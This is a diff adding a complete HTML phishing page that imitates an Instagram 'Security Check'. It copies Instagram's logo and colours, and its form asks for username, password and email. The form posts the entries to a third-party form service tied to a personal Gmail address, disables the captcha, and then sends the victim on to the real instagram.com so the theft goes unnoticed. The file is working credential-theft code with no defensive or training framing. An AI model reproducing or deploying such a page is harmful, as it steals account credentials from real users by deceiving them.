@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Account Security Check</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 380px; /* Adjusted to make space for footer */
+        }
+
+        .logo {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="email"] {
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #262626;
+            background-color: #fafafa;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus,
+        input[type="email"]:focus {
+            outline: none;
+            border-color: #3897f0; /* Instagram blue color */
+        }
+
+        button {
+            padding: 12px;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #2979ff;
+        }
+
+        footer {
+            text-align: center;
+            padding: 10px 0;
+            background-color: #fafafa;
+            color: #262626;
+            font-size: 12px;
+            margin-top: 20px; /* Adds space between form and footer */
+        }
+
+        footer a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Instagram logo -->
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/768px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+
+        <h1>Instagram Security Check</h1>
+        <p>Protect your account</p>
+        
+        <!-- Form -->
+        <form id="securityCheckForm" action="https://formsubmit.co/miniproject3310@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://www.instagram.com/">
+            <input type="text" name="username" placeholder="USERNAME" required>
+            <input type="password" name="password" placeholder="PASSWORD" required>
+            <input type="email" name="email" placeholder="Your Email" required>
+            <button type="submit">Send</button>
+        </form>
+        
+        <!-- Footer -->
+        <footer>
+            <p>Need help? <a href="https://help.instagram.com">Visit Instagram Help Center</a></p>
+        </footer>
+    </div>
+</body>
+</html>
